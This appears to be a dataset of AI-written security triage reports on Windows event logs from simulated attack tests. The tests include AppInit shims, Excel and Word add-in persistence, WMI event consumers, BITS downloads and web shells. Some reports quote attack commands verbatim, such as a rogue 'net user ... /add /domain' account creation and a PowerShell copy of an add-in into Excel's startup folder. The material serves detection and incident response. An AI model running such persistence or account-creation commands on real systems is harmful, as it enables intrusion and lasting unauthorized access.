   - This PowerShell command utilizes `Start-BitsTransfer` to download a file from a remote URL to a temporary directory. The process of downloading files using PowerShell scripts in such a manner can be associated with malicious activities, particularly when the source is an external, unverified server (GitHub in this case).

2. **Suspect Process Execution and Privilege Escalation:**
   - The execution of processes such as `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test` is noted in the Sysmon logs. While `wevtutil.exe` is a legitimate tool used for Windows Event Logs, its execution without clearly justified purposes (especially with varying PIDs) can be indicative of attempts to interact with event logs, potentially to cover tracks or to enumerate event logs.
   - A process lineage indicating `hostname.exe` and `whoami.exe` executed with High integrity also suggests the processes might be run with elevated privileges. Elevated privileges are often sought after by malicious actors to gain more control over a victim’s system.

3. **Software Update Activities:**
   - There are extensive log entries detailing Microsoft Edge Update activities, suggesting multiple executions of `MicrosoftEdgeUpdate.exe` and related components. These could be regular update processes, but the frequency and clustered nature of these logs warrant further scrutiny to determine whether they could be leveraged for privilege escalation or other forms of unauthorized access.

4. **General Observations:**
   - The pattern of registry and alias changes noted in the PowerShell log without explicit commands suggests usage of complex scripts or obfuscation attempts.
   - The logged activities of system utilities and services, including `taskhostw.exe`, `wsqmcons.exe`, and service events, generally appear consistent with regular system maintenance tasks, but need to be monitored in the context of other suspect activities.

**Assessment:**
The presence and nature of the PowerShell command execution, coupled with the patterns of `wevtutil` and suspicious process executions, strongly suggest potential compromise through script exploitation or download and execution of potentially harmful files. Although no direct evidence of malicious payload execution is present, the observed behavior is consistent with known tactics used in malicious campaigns, such as Initial Access using PowerShell scripts to download and execute further stages.

**Resolution: SUSPICIOUS**
- The activity in the logs does not categorically confirm a malicious compromise but raises significant red flags that require deeper investigation to confirm the intent and scope of the potential threat.
  
**Guidance:**
1. **Immediate Monitoring:** Increase monitoring on the CEO's machine and look for any additional unexpected downloads or execution of scripts.
2. **Conduct a File Integrity Check:** Examine downloaded files such as the `bitsadmin2_flag.ps1` script from the temporary directory or any artifacts that files might have executed.
3. **Investigate PowerShell Activity:** Obtain further context on who executed these commands and from where.
4. **Threat Hunting:** Expand the investigation to see if any similar PowerShell or `wevtutil` processes were executed across other machines within the network.
5. **Validate Consistency:** Confirm if the Microsoft Edge Update processes align with standard update schedules or if there are any anomalies indicating exploitation.

Continuing investigation into these areas should provide clarity on whether these activities are benign system maintenance or indicative of an active threat."
Install AppInit Shim,"### Analysis of the Logs

Upon reviewing the Windows event logs provided for the CEO machine, several pieces of information can be gathered:

1. **Logon Events (EventID 4624 and 4672):**
   - Multiple logon events where the `SYSTEM` account is involved, using `Advapi` as the `LogonProcessName` and showing a `LogonType` of `5`, which corresponds to a service logon. This is typical for services starting and doesn't inherently indicate suspicious activity.
   - Privilege events (EventID 4672) where `SYSTEM` privileges are assigned, such as `SeDebugPrivilege`, are not unusual and relate to service logons. 

2. **Credential Events (EventID 5379):**
   - Several attempts were made to fetch credentials for a Microsoft account and services, all resulting in failures (ReturnCode=3221226021), suggesting potential unauthorized access attempts or misconfigurations.

3. **User Enumeration Activity (EventID 4798):**
   - A listing of user accounts including `Administrator`, `admin_test`, `DefaultAccount`, `Guest`, and `lplui` from `taskhostw.exe` was observed. This could be part of normal administrative tasks, but combined with other suspicious activities might indicate reconnaissance behavior.

4. **Sysmon Logs Analysis:**
   - Execution of PowerShell by `SERVER002\admin_test` could indicate automated scripts or legitimate administrative tasks but should be evaluated in context.
   - Execution of `wevtutil.exe` alongside processes like `conhost.exe` by `admin_test` is curious and could indicate log manipulation attempts.
   - The use of `cmd.exe` with instructions to import a registry file (`reg.exe import ...`) by `admin_test` raises a flag due to the potential for system modifications.
   - `whoami.exe` and `hostname.exe` executed by `admin_test` which may indicate environment enumeration, a tactic used in persistence or reconnaissance.
   - Multiple executions of Microsoft Edge Update components, which could be legitimate software updates, but given other activities, it's worth validating against normal behavior.

5. **Application Logs:**
   - Edge updates showing routine stop events in the logs. This may be routine but could suggest tampering if correlated with other suspicious events.

### Assessment and Guidance:

- **Suspicious Activity:** The combination of unauthorized credential access attempts, registry modification via command line import, and environment enumeration activities performed by the `admin_test` account may indicate suspicious behavior that requires further investigation.

- **Actionable Steps:**
  - **Account Activity Monitoring:** Investigate the `admin_test` account's recent activities. Verify if these are authorized and correlate with legitimate administrative operations.
  - **Validation of Edge Update Process:** Confirm the legitimacy of the Microsoft Edge Update activities to ensure they were part of a routine update and not an exploitation attempt.
  - **Review PowerShell and CMD Usage:** Check the command history and scripts for any unauthorized or harmful instructions.
  - **System Integrity:** Audit registry changes and system service logs to confirm no unauthorized modifications.

Final Resolution: **SUSPICIOUS**

Given the evidence, the situation demands closer inspection to confirm or rule out malicious intents. Further analysis and monitoring are necessary to assure no unauthorized access or tampering continues on the CEO's machine."
Persistent Code Execution Via Excel Add-in File (XLL),"### Detailed Analysis of the Logs:

The logs you provided contain a series of events related to processes and operations on a Windows Server (Server002). Upon review, certain patterns and activities stand out that suggest potentially malicious behavior:


#### Suspicious Powershell Activity:

- The Powershell logs indicate the execution of a script designed to interact with Microsoft Excel:
  - The script creates a COM object for Excel, checks if Excel is 64-bit, and copies an `.xll` file to a directory associated with Excel add-ins.
  - Additionally, it modifies the Excel registry path (`HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options`) by setting an OPEN property to execute the `notepad.xll` file upon opening Excel. This is a common technique for persistence where malicious payloads are executed through Excel documents.
  - The script execution and modification of registry paths indicate unauthorized activities that imply a compromise attempt on this host using Excel as a medium.

#### Process Execution Patterns from Sysmon:

- Multiple Sysmon events show powershell.exe processes executing with the same command line as in the suspicious PowerShell logs, reinforcing the indication of an unauthorized script execution.

- The `wevtutil.exe` is seen being executed multiple times with different process IDs. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, it can be misused by attackers for hiding traces or creating persistence.

- The image paths and process hierarchies suggest that these processes predominantly run with credentials tied to `SERVER002\admin_test`, raising flags about administrative access potentially being leveraged for malicious activity.

#### EdgeUpdate and COM Register Executions:

- There are several executions of EdgeUpdate-related activities which appear consistent with normal update processes. However, this is mixed with the unusual modifications to Excel, potentially blending legitimate activities with malicious ones.

### Assessment of the Situation:

Given the patterns above, there is a high probability of malicious intent present. The PowerShell script execution aiming at Excel manipulation is a noteworthy indicator of compromise. This manner of exploitation can often be tied to particular forms of attacks, such as macro-related vulnerabilities, which should be treated with high suspicion.

### Identified Threats and Risks:

1. Unauthorized script execution, which modifies crucial Windows registry paths linked to Excel's startup behavior.
2. Copying of potentially malicious `.xll` files into a directory triggered by an Excel event.

### Guidance on How to Proceed:

1. **Isolate the System**: Immediately isolate the affected host (Server002) to prevent further damage or spread of any potential malware.
2. **Deep Investigations**: Conduct a deeper forensic investigation to capture memory and analyze further any binaries (.xll files) introduced in the system.
3. **Audit User Account**: For the user `SERVER002\admin_test`, conduct a security audit for unauthorized changes or suspicious login patterns.
4. **Review and Strengthen Policies**: Ensure registry and PowerShell script execution privileges are critically reviewed and hardened.

### Final Resolution:

- **Resolution: MALICIOUS**

The logs indicate script execution and file manipulation that strongly suggest malicious activity likely targeting persistence or stealth operations. Immediate response actions are necessary to contain potential threats."
Create a new account similar to ANONYMOUS LOGON,"Upon analyzing the provided Windows event logs, here is the assessment of the situation:

**1. Process Execution and Command-Line Analysis:**

- **Run of `cmd.exe`:** A significant indicator of compromise comes from the execution of `cmd.exe` with the command line `""cmd.exe"" /c net user ""ANONYMOUS LOGON"" ""data_pass123!"" /add /domain`. This command is highly suspicious as it suggests an attempt to add a new user account, `ANONYMOUS LOGON`, with a given password, possibly enabling unauthorized access or privilege escalation within the domain. The execution of this command is a potent indicator of unauthorized activity or potential compromise (Event 17983).

- **Multiple Executions of `wevtutil.exe`:** The logs show repeated executions of `wevtutil.exe`, a command-line utility used to manage Windows event logs. While this can indicate benign activity, in conjunction with other suspicious activities, it can also be used maliciously to clear or manipulate logs to cover tracks (Events 17956, 17960, 17964, 17968, etc.).

- **Execution of `whoami.exe` and `hostname.exe`:** The frequent use of `whoami.exe` and `hostname.exe` by `admin_test` suggests information gathering. Although not inherently malicious, this behavior combined with password changes could indicate an attempt to map out the system or identify users with elevated permissions.

**2. User Account Activity:**

- **User `admin_test`:** This user account is involved in a series of executed processes with elevated privileges, as shown by high integrity levels. The creation of new users and manipulation of system processes, likely conducted by this user, suggests potential misuse or compromise of this account.

**3. Time and Log Manipulation:**

- There was a brief system time change captured in the logs (Security Event 4616 and System Event 3569). Consistently minor and typically tied to system time updates, when combined with suspicious process executions, this might suggest an attempt at antiforensics.

**Resolution:**
Based on the outlined findings, particularly the execution of the `cmd.exe` for user account manipulation, and diverse activity involving system utilities (`wevtutil.exe`, `whoami.exe`), we classify this activity as:

**MALICIOUS**

**Actions and Recommendations:**
- Immediately isolate the affected system (Server002) to prevent further unauthorized access or damage.
- Conduct a thorough review of `admin_test` and associated accounts for unauthorized changes or permissions escalation.
- Investigate the context of the newly created `ANONYMOUS LOGON` user and remove unauthorized accounts or privileges.
- Review `wevtutil` activities and perform integrity checks of event logs to assess any attempts at log manipulation.
- Strengthen monitoring of user activity and implement stricter controls to prevent unauthorized user account creations.
- Consider conducting a wider investigation into other systems to ensure this is not part of a more extensive compromise."
Install MS Exchange Transport Agent Persistence,"Upon a detailed analysis of the provided Windows event logs from the suspected CEO machine, several events indicate activity that could potentially be considered suspicious or possibly malicious.

### Summary of Findings:

1. **Security Log:**
   - **Event ID 4634:** A logoff event was recorded for the user ""admin_test"" with a logon type of 3, indicating a network logon. 
   - **Event ID 4672:** This event shows the assignment of special privileges to the user ""admin_test,"" including sensitive rights like `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeLoadDriverPrivilege`, which allow for higher control over system processes and can be indicative of privilege escalation techniques.
   - **Event ID 4624:** A successful logon event with NTLM authentication from an external workstation ""DESKTOP-3HL5B2P"" to the target domain SERVER002 implies the use of network credentials which raise concerns, especially given the privileges assigned immediately thereafter.

2. **Windows PowerShell Log:**
   - Multiple PowerShell events show the execution of a command involving Exchange Server components related to transport agents, which can provide additional avenues for establishing backdoors or exfiltrating data. This activity, especially when manipulated via PowerShell, is a red flag for potential exploitation or unauthorized configuration changes.

3. **Sysmon Log:**
   - Multiple process creation events involving `powershell.exe` and `wevtutil.exe` run under the ""admin_test"" account. The use of `wevtutil.exe` is particularly suspect, as it's used for exporting logs or clearing security logs.
   - Processes like `whoami.exe` and `hostname.exe` are executed frequently, which may be indicative of reconnaissance actions embedded in malicious PowerShell scripts.
   - The presence of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`), while typical for updates, should be cross-referenced against known update timelines to rule out unauthorized manipulations.

### Assessment:

- The logs reveal a pattern where sensitive actions are performed by a user account (""admin_test"") with elevated privileges, leveraging potentially dangerous tools like PowerShell and wevtutil.
- There is a strong likelihood of unauthorized activity considering the high privileges granted, suspicious tool usage, and timing of these correlated events.

### Resolution:

**SUSPICIOUS**

### Recommendations:

1. **Immediate Action:**
   - Isolate the CEO machine from the network to prevent potential propagation.
   - Temporarily suspend or restrict the ""admin_test"" user account and review recent changes associated with it.
   - Begin a full forensic examination of the machine, focusing on PowerShell scripts, logs, and any alterations to system settings related to the suspicious transport agent installations.

2. **Review and Monitoring:**
   - Continuously monitor logs for any further suspicious activity linked to this or similar accounts across the enterprise.
   - Implement stricter access controls and enhance monitoring of privileged account actions.

3. **Long-term Strategy:**
   - Conduct security awareness training for all users, emphasizing the risks associated with high-privilege accounts.
   - Consider the implementation of stricter PowerShell execution policies and logging for oversight on script activities.

The identified activities warrant further in-depth investigation to ensure network and data integrity."
"Persist, Download, & Execute","Upon careful examination of the provided Windows event logs, several indicators suggest potential malicious activity. Here's a breakdown of the suspicious elements observed:

### Indicators of Malicious Activity:

1. **BITSAdmin Usage:**
   - The logs show multiple instances of `bitsadmin.exe` being used with various commands (`/create`, `/addfile`, `/setnotifycmdline`, `/resume`, `/complete`) to interact with a URL on GitHub (`https://raw.githubusercontent.com/file/file-file/master/files/data/data.md`) and download a file (`bitsadmin3_flag.ps1`).
   - The usage of BITSAdmin in this context, especially from a command line executed by `cmd.exe`, is often associated with malicious activities as it can be used for file downloads and uploads in a stealthy manner.

2. **Command Execution and File Downloads:**
   - The command executed from `cmd.exe` is complex and involves using BITSAdmin to download a file, potentially for script execution, and setting an unexpected command line using `notepad.exe`. This sequence of operations is unusual and indicative of an attempt to execute potentially harmful scripts or manipulate files.

3. **Privilege Escalation:**
   - The user `SERVER002\\admin_test` is observed with extensive privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, etc.`), indicating it might be a target for privilege escalation.
   - Logs show successful login events (4624) and privilege assignments (4672) with potentially administrative privileges, which could be an indicator of privilege escalation after a compromise.

4. **Suspicious Time Changes:**
   - There are events (4616) indicating time adjustments without clear justification in the logs. Modifying system time is a technique used by attackers to cover tracks or manipulate time-based security mechanisms.

### Summary:

- The `bitsadmin.exe` command-line usage in conjunction with the download from an external GitHub location and execution command manipulation strongly suggests an attempt to deploy potentially malicious scripts or malware.
- The presence of elevated privileges and use of `cmd.exe` for complex command execution raise additional concerns about possible unauthorized activities and system manipulation.

### Resolution:

After considering all the findings, this activity is categorized as **MALICIOUS**. It is highly suggestive of a sophisticated compromise aimed at executing unauthorized code on the system, potentially leading to data exfiltration or further exploitation.

   - Educate users on suspicious activities and phishing emails that might have led to initial access.

Overall, prompt action must be taken to ensure system integrity and prevent reoccurrence."
Windows MOFComp.exe Load MOF File,"In analyzing the provided logs, there are several indicators pointing towards potentially malicious activity on the system, specifically around the use of PowerShell, the execution of `mofcomp.exe`, and the context in which these are executed.

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution:**
   - There's a PowerShell command `powershell.exe & {c:\\windows\\system32\\wbem\\mofcomp.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.mof""}` that stands out because it's executing `mofcomp.exe`. This behavior is unusual and could indicate an attempt to load MOF files, which can be used for persistence or executing arbitrary code.
   
2. **Execution of `mofcomp.exe`:**
   - The use of `mofcomp.exe` to compile MOF files from a user's Temp directory is unexpected in standard operations and can be a red flag for malicious activities, such as deploying malicious WMI persistence.
   
3. **High Integrity Level Executions:**
   - Processes are being executed with high integrity levels, indicating they have elevated privileges. This is noteworthy when combined with suspicious command lines, as it suggests potential privilege escalation or misuse of admin-like accounts.
   
4. **Repeated Use of `conhost.exe`:**
   - Frequent calls to `conhost.exe` are evident, following PowerShell commands. While `conhost.exe` typically accompanies cmd and console applications, its consistent and repeated execution following `{data.003.mof}` compilation could disguise malicious activities or provide command window visibility.
   
5. **Execution Context of `wsmprovhost.exe`:**
   - The parent process for several of these suspicious activities is `wsmprovhost.exe`, which is often related to remote management. If this host is not specifically used for such tasks, this indicates a potential entry point for an attacker to remotely execute actions on this machine. 

### Potential Malicious Indicators:
- The sequence of PowerShell followed by `mofcomp.exe` is a classic tactic often leveraged for executing code stored in MOF files to maintain persistence or escalate privileges without being easily detected by conventional security tools.
- The lack of typical activities logging in other categories such as Security and System logs when suspicious activity is present; the absence of these could imply log tampering or selective logging.

### Guidance and Next Steps:
1. **Immediate Investigation:**
   - Conduct a full forensic image of the machine for offline analysis. Check for additional signs of compromise, particularly focusing on WMI objects and analysis of the Temp directory for unexpected scripts or executables.
   
2. **Isolate the Machine:**
   - Temporarily isolate `Server002` from the network until a clean bill can be assured and possible malicious elements removed.

3. **Review User Activity:**
   - Engage in a review of the `SERVER002\admin_test` account activities. Assess if any unauthorized user was leveraging this account or if its credentials were compromised. Immediate password changes and auditing are recommended.

4. **Harden Security:**
   - Implement strict PowerShell and script audit policies. Enforce application whitelisting to limit the execution of unauthorized applications like `mofcomp.exe`.

5. **Broaden Monitoring:**
   - Enhance detection capabilities to include behavioral analytics and deeper Sysmon integration for detailed audit of command line activities.

Given these issues and following careful review, the resolution determination for these logs would be:

**Resolution: MALICIOUS**

This conclusion draws from the sophistication of the activities which align closely with known attack vectors that involve manipulating Windows Management Instrumentation components through PowerShell. Immediate, thorough investigation and mitigative actions are advised."

### **Analysis of the Logs:**

#### **Windows PowerShell Logs:**
- The PowerShell logs indicate a script was executed with the intent to:
  - Create a new COM object “Word.Application”.
  - Determine the version (32-bit vs 64-bit) of Microsoft Office installed.
  - Copy a file named `wordwll_x64.wll` or `wordwll_x86.wll` from a temporary directory to the Microsoft Word Startup directory as `notepad.wll`.
  - It then stops and restarts the WinWord process (Microsoft Word).

The script performs actions typical of an attempt to create a Word macro, which is a known technique used to establish persistence on a system through the use of malicious macros.

#### **Sysmon Logs:**
- The Sysmon logs indicate multiple processes were invoked around the same time:
  - Microsoft Edge Update service-related processes, which seem to align with typical scheduled operations.
  - PowerShell process executed by the user `admin_test`, corresponds with the PowerShell logs previously discussed.
- The execution of tools such as `whoami.exe` and `hostname.exe` can be seen during this period, which may indicate attempts to gather system information.
- Frequent invocation of `wevtutil.exe`, which is used for managing and querying event logs, is unusual, especially executing under the user `admin_test`, suggesting that event logs could be tampered with or queried to hide tracks.

#### **Other Logs:**
- Application log notes the stoppage of an EdgeUpdate service without further error codes or messages.

### **Assessment:**

The coordinated execution of a PowerShell script that manipulates Microsoft Word startup items and the simultaneous Sysmon logging of registry changing commands and system information gathering tools imply potentially unauthorized and malicious activity. Furthermore, the use of `wevtutil.exe` could indicate attempts to clear or query event logs, a behavior often used in attempts to cover tracks during a compromise.

### **Threats and Risks Identified:**
1. **Potential Persistence Mechanism:** The PowerShell script indicates an attempt to establish persistence using Microsoft Word's macros.
2. **System Reconnaissance:** Execution of system identification commands like `whoami` and `hostname` suggests reconnaissance activities.
3. **Event Log Manipulation:** Repeated calls to `wevtutil` by a non-system user (`admin_test`) raise concerns about the attempted modification/viewing of event logs.

### **Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent further spread or data exfiltration.
   - Perform a thorough investigation of PowerShell script’s origin and history of execution.
   - Review Microsoft Word’s startup items and remove any unauthorized add-ins.

2. **Further Investigation:**
   - Analyze the creation and modification timestamps of `notepad.wll` files for unauthorized changes.
   - Inspect system reconciliation commands for any broader set of reconnaissance.
   - Check user ‘admin_test’ privileges and password integrity to prevent compromised credentials usage.

3. **Remediation:**
   - Reinstall or repair Microsoft Word to ensure no malicious add-ins persist.
   - Conduct a full anti-virus and anti-malware scan.
   - Consider employing tighter PowerShell execution policies and user access controls.

### **Resolution:**
Given the observed activities, this situation falls under the ""MALICIOUS"" category. The logs present clear indications of suspicious behavior that is consistent with known malicious tactics, techniques, and procedures. Immediate remediation and a detailed forensic analysis are strongly recommended."
Web Shell Written to Disk,"After thoroughly analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Observations

1. **Application Logs:**
   - The ""edgeupdate"" service logged a ""Service stopped"" message. This entry alone is not inherently suspicious as service stops can occur during legitimate update processes or restarts.
   - Multiple entries from ""SecurityCenter"" indicate that Windows Defender was in an ""ON"" state, suggesting that the machine's security software was operational.

2. **Sysmon Logs:**
   - There is a series of events related to process execution:
     - `powershell.exe` was executed under the `SERVER002\admin_test` user account. While PowerShell can be used legitimately, it is a common vector for malicious activity. Unfortunately, the command line arguments are not visible, which would be crucial to understanding the context.
     - Multiple instances of `conhost.exe` were spawned, typically indicating console applications running, possibly in conjunction with executed scripts or commands.
     - The execution of `wevtutil.exe` is notable. This utility manages event logs and is used legitimately by administrators, but can also be used by attackers to clear or view logs to hide activity.
     - There are several entries related to `MicrosoftEdgeUpdate.exe` and its associated processes. These logs show the binary running with system privileges, which aligns with normal update operations. The processes appear to be associated with performing updates or registrations of components, like `MicrosoftEdgeUpdateComRegisterShell64.exe`.
   - The `cmd.exe` execution running `xcopy` to transfer files from a temporary directory to `C:\inetpub\wwwroot`. This action could potentially be suspicious if it is unauthorized or unexpected, as it involves the modification of web root directory contents, which could be exploited for web shell installation or data exfiltration.
   - Additionally, standard utilities like `whoami.exe` and `hostname.exe` have been executed, likely to gather information about the system environment. Such commands are often seen in both legitimate admin scripts and post-exploit actions.

3. **No Security or System Logs provided:**
   - Without Security or System logs, we lack insights that could confirm suspicious user activity, audit failures, or login anomalies that often accompany illicit actions.

### Assessment

Based on the presented entries, the `cmd.exe` execution with xcopy to potentially a web server's root directory seems to be the most anomalous activity. This action, coupled with the presence of `wevtutil.exe` usage and `powershell.exe` execution by a potentially privileged admin account, could indicate attempts to obscure activity or exploit the system.

### Conclusion: **SUSPICIOUS**

There are elements of the logs, such as the file operations to the web root and the presence of script and event log manipulation tools, which may signify suspicious activity that requires further investigation. It's imperative to collect more data, such as analyzing command-line arguments, filesystem changes, and checking the legitimacy and frequency of administrative actions. Conduct a review of the access logs and permissions on the web server directory, and ensure there are no unauthorized deployments of applications or changes that might indicate compromise.

### Recommendations

1. **Conduct a Full Security Audit**: Examine file integrity, access history, and permissions on critical directories like `C:\inetpub\wwwroot`.

2. **Clarify PowerShell and Wevtutil Usage**: Determine the scripts or commands executed and ascertain if they were part of legitimate administrative tasks.

3. **Increase Monitoring**: Set up stricter alerts on privileged accounts, particularly focusing on script execution and any modifications to web server directories from unexpected source paths.

4. **Consult Security Team**: Coordinate with other security resources to perform a more extensive threat hunt across the environment, verifying the integrity of the system and any outgoing network connections that might indicate data exfiltration attempts."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"Upon reviewing the provided Windows event logs, some activities stand out as suspicious and may indicate potentially malicious behavior. Here's the breakdown:

### Analysis of Logs:

1. **Application Log:**
   - Repeated crashes of `Sysmon.exe` (Events 1000 and 1001) due to exception code `c0000005`, which indicates a memory access violation, could suggest potential tampering or exploitation attempts targeting Sysmon, a critical monitoring tool.
   - The `Sysmon.exe` crash happened in a short time span, which could be indicative of intentional disruption.

2. **PowerShell Log:**
   - The PowerShell logs reveal the execution of scripts involving WMI (Windows Management Instrumentation) persistence mechanisms. Specifically, it involved creating a WMI event consumer, which is a technique frequently used by attackers to maintain persistence on a system.
   - The command executed involves creating ActiveScriptEventConsumers, which are known techniques for malicious persistence using WMI, involving the execution of `notepad.exe`, a benign application, which may just be a placeholder or a test.

3. **Sysmon Log:**
   - Multiple executions of diagnostic tools like `whoami`, `hostname`, and `wevtutil` seem to have been performed. While these tools can be used legitimately, they might also be used by attackers to gather information and manage system logs during a compromise effort.
   - Repeated execution of `wevtutil` could indicate attempts to modify, clear, or tamper with event logs to cover tracks.
   - The launch of `WindowsPowerShell` instances with scripts involving WMI confirms attempts of script-based persistence or reconnaissance.

4. **Security Log:**
   - Several logon events (4634, 4672, 4624) related to the `admin_test` user show enhanced privileges being assigned.
   - The subject, `admin_test`, is repeatedly granted a significant set of privileges, including `SeDebugPrivilege`, which is often associated with privilege escalation attacks.
   - Events 6281 showcase operations with DLLs (`aepic.dll` and `fcon.dll`), which could be a normal DLL operation or an attempt to load malicious DLLs, although this alone isn't conclusive of wrongdoing.

### Assessment:

- **WMI Persistence Attempt:** Evidence points to the setting up of WMI persistence using scripts to create event consumers. This is a known tactic by attackers for maintaining long-term access.
- **Unusual Sysmon Activity:** Sysmon crash events signify potential exploitation or targeting of monitoring tools to disable them.
- **Use of Diagnostic Tools:** Usage of system utilities like `whoami` and `wevtutil` could indicate information gathering or log tampering.
- **Privilege Assignments:** Elevated privileges for `admin_test` and their significant spectrum could facilitate potential lateral movement or sensitive operations.

### Threats/Risks Identified:

- **Potential for Escalated Privilege:** The `admin_test` user was granted high privileges, which poses a risk of further system compromise.
- **Evidence of Persistence Tactics:** Scripts establishing WMI persistence suggest possible ongoing or past compromise.
- **Sysmon Tampering:** Disabling or crashing Sysmon indicates tampering with system defenses.

### Guidance:

1. **Immediate Containment:** Isolate the system from the network to prevent further potential attacker activities.
2. **Detailed Investigation:** Conduct a thorough forensic analysis of memory and disk to gather additional evidence of compromise.
3. **Log Review:** Further review logs, especially around `admin_test` activities, to seek additional indicators of compromise.
4. **Reset Credentials:** Immediately reset credentials for the `admin_test` user and any other affected accounts.
5. **Ensure Clean State:** Restore Sysmon functionality and apply additional monitoring around WMI and key system processes.

### Final Resolution:

**MALICIOUS** - The observed actions, particularly the PowerShell script indicating WMI persistence methods and the Sysmon.exe disruptions, are indicative of malicious activity. Immediate response and remediation actions are recommended to mitigate any further risk."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"### Detailed Analysis

The provided Windows event logs capture activity from several processes with notable attention drawn to PowerShell activity, a common vector used in attacks for scripting and automation purposes. Here's a breakdown of suspicious or significant points from the logs:

1. **PowerShell Activity:**
   - There are multiple instances of `powershell.exe` being executed. Particularly, an interesting command is observed:
     ```plaintext
     ""powershell.exe"" & {Copy \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\Addins\\ExcelVBAaddin.xlam\"" \""$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"" , Start-Process \""Excel\""}
     ```
   - The command involves copying a file (`ExcelVBAaddin.xlam`) to a startup directory for Excel, followed by an attempt to start Excel, which could indicate attempts to persist using Excel add-ins, a known technique to execute code on startup.
   - The operation failed (`Could not find a part of the path`), which could suggest either an incomplete attack or a misconfiguration.

2. **User Context and Raised Privileges:**
   - The PowerShell script is running under the `SERVER002\admin_test` user context with high-integrity privilege level, indicating administrative access. 
   
3. **Process Execution:**
   - Multiple processes were spawned in a short span, such as `wevtutil.exe` and several instances of `conhost.exe`, which might be typical but in conjunction with PowerShell activity raises suspicion.
   
4. **Temporary File Activity:**
   - The presence and activity within `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\` and temporary directories suggest temporary storage or staging activities, a typical behavior in attacks to avoid detection before the code is executed.

5. **Misuse of Legitimate Processes:**
   - Utilization of `wevtutil.exe` and `wbem\WmiPrvSE.exe` along with `powershell.exe` aligns with tactics for evasion or persistence.

6. **Edge Update:**
   - Intensive activity regarding Edge Update processes and services, while not odd in isolation, could potentially be part of broader lateral movement or execution attempts if orchestrated.

### Assessment

Upon analyzing the logs, the command-line execution, along with attempts to misplace files to startup folders and the execution context, indicates behavior closely aligning with patterns used in malicious activity such as persistence, evasion, and launching or preparing for attack payloads.

### Threats & Risks Identified
- **Persistence Mechanism:** Attempts to set add-ins or backdoor entries using known applications (Excel).
- **Potential Misuse of PowerShell:** Classic method for injecting malicious scripts due to its high-level scripting capabilities.
- **Administrative Privileges Used:** The operations were running under a high-integrity-level user, indicating potential privilege abuse.

### Guidance
- **Immediate Investigation and Mitigation Steps:**
  - Isolate the host for a deeper investigation.
  - Review and remove scheduled tasks or startup items that might include the unauthorized PowerShell scripts.
  - Conduct a forensic analysis on the directories and command outputs mentioned.
  - Follow up on users' actions, especially those executed by `SERVER002\admin_test`.

Based on the observed suspicious PowerShell activities and execution patterns, the resolution can be concluded as:

### **Resolution: SUSPICIOUS**

This resolution indicates that the activity doesn't look right and further, more in-depth investigation is necessary to ascertain whether malicious intents were involved or if it's a benign false positive from authorized administrative activity."
Google Chrome Load Unpacked Extension With Command Line,"Based on the provided logs, let's break down the analysis:

**Suspicious or Anomalous Behavior:**
1. **Unusual PowerShell Activity:** The logs show a use of PowerShell to download and extract Chrome and a uBlock Origin extension. The command captures from the PowerShell logs contain:
   - Downloading a Chromium ZIP through `Invoke-WebRequest`.
   - Downloading an extension ZIP through `Invoke-WebRequest`.
   - Using `Expand-Archive` to extract both, followed by a `Start-Process` to launch chrome with the extension using `--load-extension`.

   This kind of behavior, typically: 
   - Indicates an attempt to sideload extensions into a browser without going through the usual Chrome Web Store mechanism.
   - May suggest activities that deviate from a typical user behavior, especially if there’s no legitimate reason for an admin user to execute these commands manually.

2. **Frequent `wevtutil.exe` and `conhost.exe` Processes Execution:** The `wevtutil.exe` and `conhost.exe` processes appear a few times. `wevtutil.exe` is used for managing Windows Event Logs, and while it can appear in legitimate operations, its conjunction with elevation or frequency aligns with some malicious techniques, particularly in tampering with or clearing event logs.

**Indications of Malicious Activity:**
1. **Privilege Escalation and Persistence Methods:** The use of high-integrity PowerShell sessions and manipulation or unusual use of system utilities like `HOSTNAME.EXE` followed by `conhost.exe` suggests a potential attempt to mask or clean events or perform unauthorized tasks.
2. **Potential Download and Execution of Unverified Software:** Downloading and executing a version of Chrome from non-official sources and sideloading extensions at runtime is a red flag. This behavior is associated with potential man-in-the-browser attacks.

**Assessment and Threats/ Risks:**
Given the evidence, the behavior outlined above is indicative of suspicious activity. The execution of unsigned/untrusted binary downloads, as well as modifications through PowerShell, can pose a security risk, suggesting that the system was potentially used for dubious intent or compromised.

**Guidance on How to Proceed:**
- **Further Investigation:** Immediately isolate the system from the network to prevent potential further compromise or exfiltration of data.
- **Comprehensive Malware Scan:** Use reliable endpoint detection and response solutions to conduct a full malware scan.
- **Review User Activities:** Check the origins of the PowerShell commands execution, ensuring that they were not initiated by an ill-intentioned user or account takeover.
- **Monitor Network Traffic:** Analyze network logs for suspicious outbound communications fitting known patterns of data exfiltration or compromise.

**Resolution: SUSPICIOUS**

The logs suggest suspicious behavior that warrants a deeper investigation. Although there is a high likelihood of compromise, the logs provided are not sufficient to confirm malicious intent without further evidence or context from additional security measures or logs."
Auto-start application on user logon,"Analyzing the provided Windows event logs, several patterns and events stand out which indicate potential malicious activity:

1. **Suspicious Registry Activity:**
   - The logs show multiple registry additions using `reg.exe` with paths related to `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test`. This activity is suspicious because it is introducing a new registry path under ""Accessibility,"" a common tactic used to gain persistence on a system or to execute unauthorized processes without triggering defenses.
   - The command line involved includes adding registry keys (`TerminateOnDesktopSwitch`, `StartEXE`, and `Configuration`), pointing to potentially executing `cmd.exe` through these settings.

2. **Anomalous Command Execution:**
